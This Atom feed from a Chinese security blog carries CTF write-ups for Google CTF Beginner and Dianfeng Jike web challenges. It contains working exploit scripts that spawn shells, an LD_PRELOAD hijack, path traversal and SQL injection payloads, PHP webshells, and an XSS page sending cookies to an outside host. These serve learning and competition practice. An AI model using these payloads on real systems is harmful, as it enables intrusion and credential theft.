<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风之栖息地</title>
  
  <subtitle>habitat of wind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hurricane618.me/"/>
  <updated>2018-08-14T16:47:21.273Z</updated>
  <id>https://hurricane618.me/</id>
  
  <author>
    <name>hurricane618</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Google CTF Beginner Part2</title>
    <link href="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/"/>
    <id>https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/</id>
    <published>2018-08-14T16:47:21.000Z</published>
    <updated>2018-08-14T16:47:21.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beep是CVE-2018-0492，详细的漏洞细节 <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> 。一开始以为要用这个的exp，结果一看给的二进制文件，似乎不太对……我们需要得到<code>/secret_cake_recipe</code>的内容，然而权限不够，所以这里应该是拿来越权的。</p><img src="/2018/08/15/google-ctf-beginner-part2/1.png"><p>我们看到第一个if是一个通过信号触发的条件，第二个if知道了程序需要参数，然后会open一个写死的路径，之后将输入的参数代入<code>ioctl(device,0x4B2F,参数)</code>，出现问题就会打印报错信息，然后关闭打开的文件。循环上面的操作把所有的参数都跑一遍。</p><p>信号触发的if会执行额外的一段函数。</p><img src="/2018/08/15/google-ctf-beginner-part2/2.png"><p>这里if成功的话就会打印错误信息，读取open的文件输出出来。这里应该是重点，有读写操作。</p><p>如果我们读的文件是<code>/secret_cake_recipe</code>那么只要触发signal以及满足if判断就可以拿到数据。这里可以用<code>ln -s</code>软链接生成<code>dev/console</code>，然后我们执行该程序同时发送SIGTERM信号就可以越权拿到数据。这里需要注意的是我们要让程序延长运行时间才行，如果运行时间不足，还没接收到信号就结束了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里需要多试几次来触发条件竞争，最后拿到flag</p><img src="/2018/08/15/google-ctf-beginner-part2/3.png"><h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>看了题目的介绍，再加上这个补丁信息，知道了有路径穿越漏洞。而一看提供的功能中只有第二个选项有读的操作，然后试了一下<code>../../../../../../../../../../../etc/passwd</code>，果然读到了passwd文件。</p><img src="/2018/08/15/google-ctf-beginner-part2/4.png"><p>那么剩下来的就只是寻找要读的文件了。</p><p>通过使用<code>../../../../../../proc/self/cmdline</code>得到运行程序的命令行参数。</p><img src="/2018/08/15/google-ctf-beginner-part2/5.png"><p>得到运行程序的命名，需要猜路径，猜到了<code>../main</code>，把读取到的二进制文件保存下来 <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p><p>再通过16进制编辑器把多余的目录删掉，这样就得到了服务器上的二进制文件。</p><p>浏览代码，在验证登录的过程中打开了<code>flag</code>文件，然后比较输入。这样目标就很明确了，直接读<code>../flag</code>就可以拿到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/6.png"><h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>继续上一题的程序分析第二个密码</p><img src="/2018/08/15/google-ctf-beginner-part2/7.png"><p>可以看到这里对我们的输入异或之后会得到flag数组中的赋值，我们可以得到flag数组的值，只要再次异或回去即可得到密码。</p><img src="/2018/08/15/google-ctf-beginner-part2/8.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/9.png"><h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>这里有两个漏洞点，第一个是格式化字符串漏洞，第二个是栈溢出漏洞，我这里是使用的是栈溢出漏洞。</p><img src="/2018/08/15/google-ctf-beginner-part2/10.png"><p>看到缓冲区的位置离bp寄存器有0x30的距离。</p><img src="/2018/08/15/google-ctf-beginner-part2/11.png"><p>又因为是64位程序，所以再加上8个字节的RBP，最后加上我们的geishell函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/12.png"><h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>虽然标签写的是RE但是……，做完的感觉就是一个MISC。</p><p>首先拿到一个zip文件，解压之后是一个gz压缩包，再次解压得到ext4的文件，搜索之后得知是一个Linux的文件系统。直接挂载之，<code>mount -t ext4 challenge2.ext4 /mnt</code>，需要root权限。挂载之后寻找线索，找了一圈在根目录下有个隐藏压缩文件<code>.mediapc_backdoor_password.gz</code>，解压cat一下，得到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/13.png"><h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>一个简单的字符串逆序程序，有两个参数，第二个参数会被逆序，然后和<code>zLl1ks_d4m_T0g_I</code>比较，这样就简单了，直接逆转回来就好。</p><img src="/2018/08/15/google-ctf-beginner-part2/14.png"><img src="/2018/08/15/google-ctf-beginner-part2/15.png"><h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>给了一个python文件，大概的功能是能记录歌手和歌曲的一个简易控制台，要我们获取oauth_token。在输入点中过滤了单引号，而且输入点只有一个没有办法使用\来转义单引号逃逸字符串，所以这里只能寻找其他思路来突破。</p><img src="/2018/08/15/google-ctf-beginner-part2/16.png"><p>观察到这里有一个从数据库随机读歌手的操作，再加上之前的操作单引号，双引号过滤不一致。</p><img src="/2018/08/15/google-ctf-beginner-part2/17.png"><p>那么这里的不一致性就会造成二阶注入，我们可以在过滤双引号的输入点中注入带有单引号的数据，然后在随机读歌手的时候单引号会被代入SQL语句中造成SQL注入。</p><p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p><p>这里顺带一提不能使用#注释符，因为#符号在python中也是注释符会破坏语法。</p><img src="/2018/08/15/google-ctf-beginner-part2/18.png"><h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>给了C的源代码，主要操作就是设置环境变量，代码中过滤了一些常见的环境变量。</p><img src="/2018/08/15/google-ctf-beginner-part2/19.png"><p>问题出在这个过滤只执行一次，所以我们重复设置环境变量就可以了。这里是利用LD_PRELOAD劫持函数，执行我们编译的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc load.c -o load -shared -fPIC</code>生成动态链接文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/20.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了一些PWN方面的知识还是不错的，丰富知识面。就是想吐槽这个题目的标签，很多都是挂羊头卖狗肉。</p><img src="/2018/08/15/google-ctf-beginner-part2/21.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Holey-Beep-PWN&quot;&gt;&lt;a href=&quot;#Holey-Beep-PWN&quot; class=&quot;headerlink&quot; title=&quot;Holey Beep(PWN)&quot;&gt;&lt;/a&gt;Holey Beep(PWN)&lt;/h2&gt;&lt;p&gt;Holey Beep是CVE-2018-
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客CTF 部分Web复现</title>
    <link href="https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/"/>
    <id>https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/</id>
    <published>2018-08-01T05:17:19.000Z</published>
    <updated>2018-08-01T05:23:31.869Z</updated>
    
    <content type="html"><![CDATA[<p>复现了三道题，其他的都关环境了，记录一下复现的这三道吧。</p><h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p>在网上找到的onethink的漏洞分析文章</p><p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p><p>这个是原理相同的，只不过是thinkphp</p><p><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p><p>通过这些我们知道，问题是出在缓存的存储上，我们的用户名被简单的反序列化存储进了缓存文件中。所以要getshell的话我们只需要通过用户名传入webshell。但是这里有个条件，我们必须能猜到缓存文件的名字。</p><p>在题目的根目录下扫到 www.zip 得到题目的源码，在这里我们看到filename的命名规律，以及目录。推测这里的源码和线上是一样的，所以条件满足。</p><img src="/2018/08/01/dianfengjikeCTF-web/1.png"><p>我们在本地测试的时候，删除 Application/Install/Data/install.lock 文件，然后通过install.php安装，随后通过在本地生成缓存文件来预测题目的缓存文件，最后代码执行拿flag。</p><p>由于用户名有长度限制，所以分两次注册。第一次<code>%0a%0d$x=$_GET[x];\\</code>，第二次<code>%0a%0deval($x);\\</code></p><p>注册之后必须要登录一下，这样就把webshell写入了缓存文件中了。</p><img src="/2018/08/01/dianfengjikeCTF-web/2.png"><p>之后在题目中重复步骤，就可以拿到webshell，执行代码搜索flag</p><img src="/2018/08/01/dianfengjikeCTF-web/3.png"><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>这道题一开始想法是通过收集信息社工得到flag……，先是看到<a href="mailto:BabyWeb@my.lol" target="_blank" rel="noopener">BabyWeb@my.lol</a>，然后访问my.lol可以得到一个qq邮箱，结果这个qq没什么东西，思路就断在这里了。</p><p>参考了其他人的writeup，发现要通过这些信息猜测后台，爆破密码……像这种信息量较少的题目，都会有一些扫目录，扫端口，收集子域名之类的操作。</p><p>输入<a href="http://106.75.2.4/babyweb" target="_blank" rel="noopener">http://106.75.2.4/babyweb</a> ，自动跳转到<a href="http://106.75.2.4/babyweb/login.php" target="_blank" rel="noopener">http://106.75.2.4/babyweb/login.php</a> ，看了一个writeup有的队伍能直接根据收集的信息爆破出用户名和密码。。。这操作太强了，我是搞不出来，所以就按照常规操作扫端口。</p><img src="/2018/08/01/dianfengjikeCTF-web/4.png"><p>根据扫出来的结果可以看到开放了3306端口，使用hydra爆破之。这个我在一开始的时候爆破的是root用户，结果看提示已经改成另外的用户了……哭唧唧，最后是在writeup的帮助下知道了用户名为babyweb，这个可以通过网站的信息推测出来。</p><p>拿到密码之后，连接数据库。</p><img src="/2018/08/01/dianfengjikeCTF-web/5.png"><p>然而并没有某writeup中所说的用户名密码，可能被删了，所以这里就只能直接用writeup中的用户名密码登后台了。</p><p>后台有个简单的文件上传，然后后缀有限制只能是图片后缀，这里上传之后没有路径，但是我们有数据库的数据，根据数据库中的数据我们可以得到上传后文件的文件名再加上img路径就可以知道文件的路径。再看看上传的类型中还有htaccesss，这里就是文件上传的漏洞利用。</p><p>通过上传htaccess文件来让一些后缀得到解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>最后上传.abc为后缀的webshell即可</p><img src="/2018/08/01/dianfengjikeCTF-web/6.png"><h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>网站使用metinfo模板，在网上搜索一番，看到了几个SQl注入的洞，试了试都不行，索性放弃，看writeup。</p><p>扫描目录扫出file/file.php，能删除文件，然后没有对..过滤导致可以跨目录删除文件…… emmmm 看来是为了比赛额外添加了一个文件删除，这个如果字典没扫出来就根本无法下手了。</p><p>删除文件的路径中有对<code>./</code>的过滤，所以最后删除的路径为<code>...//xxxx/xxx</code><br>扫到这个之后，在之前的metinfo漏洞里面有讲删除install.lock文件，导致重装的问题，再加上metinfo对数据库参数过滤不严的问题，只要数据库配置参数中任意一项填入一句话木马<code>#*/@eval($_REQUEST[xxx]);/*</code>，就可以成功getshell。</p><img src="/2018/08/01/dianfengjikeCTF-web/7.png"><p>虽然安装步骤没有走完，但是只要数据库创建成功，就可以通过config/config_db.php拿shell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://url.cn/5HWdbfS" target="_blank" rel="noopener">http://url.cn/5HWdbfS</a></p><p><a href="https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg</a></p><p><a href="https://xz.aliyun.com/t/2469" target="_blank" rel="noopener">https://xz.aliyun.com/t/2469</a></p><p><a href="https://www.safeinfo.me/ldgb/75.html" target="_blank" rel="noopener">https://www.safeinfo.me/ldgb/75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现了三道题，其他的都关环境了，记录一下复现的这三道吧。&lt;/p&gt;
&lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part1</title>
    <link href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/"/>
    <id>https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</id>
    <published>2018-07-18T15:03:09.000Z</published>
    <updated>2018-07-19T01:15:59.326Z</updated>
    
    <content type="html"><![CDATA[<p>会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。</p><h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>原理说出来都很简单，考察的是PDF中表层的覆盖其实还是可读的，所以我们选中需要的内容复制粘贴出来就可以了</p><img src="/2018/07/18/google-ctf-beginner-part1/1.png"><p>复制粘贴大法</p><img src="/2018/07/18/google-ctf-beginner-part1/2.png"><h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>一道题考察图片转文字之后，运用古典加密解决问题。学到新的知识OCR，PDF或者图片转文本的技术。</p><p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">在线转换链接</a></p><img src="/2018/07/18/google-ctf-beginner-part1/3.png"><p>之后在凯撒加密中破解，因为题目中包含着凯撒，提示也是很明显了。</p><img src="/2018/07/18/google-ctf-beginner-part1/4.png"><h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>考察了一个细节点，当我们处于man手册的状态下可以使用 !command 的方式来执行命令</p><img src="/2018/07/18/google-ctf-beginner-part1/5.png"><p>我们就直接ls出home目录下有东西，然后cat出来即可。</p><h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>给了一个图标文件，看了文本内容没什么东西，然后开始用binwalk分析一下</p><img src="/2018/07/18/google-ctf-beginner-part1/6.png"><p>果然里面有东西，改成zip解压出来就ok了</p><img src="/2018/07/18/google-ctf-beginner-part1/7.png"><h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>在上一道题目中留下了一个 <code>www.com</code> 文件，com后缀查了一下是MS-DOS的执行文件，所以现在的windows系统是无法执行的，DOSBOX启动！</p><p>直接运行就出现一个毫无意义的话，没有什么结果之后把二进制文件转成文本看看其中的内容，也没有什么收获……</p><p>经过其他人的Writeup之后得知要调试这个程序，在调试中发现，它会对其中的某个段取出字符异或然后重写回去，这样就好办了，一直跟踪调试，每次经过一些重写操作之后看看内存中的数据。最后得到flag。</p><img src="/2018/07/18/google-ctf-beginner-part1/8.png"><h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>一道很猥琐的题目…… 通过file命令知道得到的文件是个zip压缩包，然后就开始了，一直解压解压解压。。。</p><p>最后拿到一个password的压缩包里面有个password.txt需要密码，看他题目中有提示john，暗示John The Ripper，这个暴力破解工具。</p><p>所以我们就暴力一下吧，我这里用的是ARCHPR</p><img src="/2018/07/18/google-ctf-beginner-part1/9.png"><p>得到密码asdf，解压得到password.txt</p><img src="/2018/07/18/google-ctf-beginner-part1/10.png"><p>拿到flag</p><h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>打开网站是一个登录页面，输入账号和密码之后，发现会显示在页面上，根据题目的提示，XSS无疑。我们输入script验证漏洞，结果被chrome的auditor拦截。GG，这里img，svg等等标签失去作用，就算用src=javascript:alert(1) 这样的形式也会变成500……</p><p>无奈之前，看了看别人的writeup，发现它们是利用了页面中的//分隔符，把script拆成了两个部分，这样就绕过了auditor的检查。</p><p>那么可以引入js执行了，怎么偷管理员的cookie呢？必须要让管理员用这样的username和password登录才行，所以就是CSRF了。</p><p>给管理员一个可以自动提交的网站，提交这些内容，就会触发js拿到cookie。代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在11.js中，放入偷cookie的语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>这样在我们的服务器的日志中就可以看到带有cookie的请求了。但是由于比赛已经结束，估计机器人也没了，所以只能直接抄wp中的cookie进入后台。</p><img 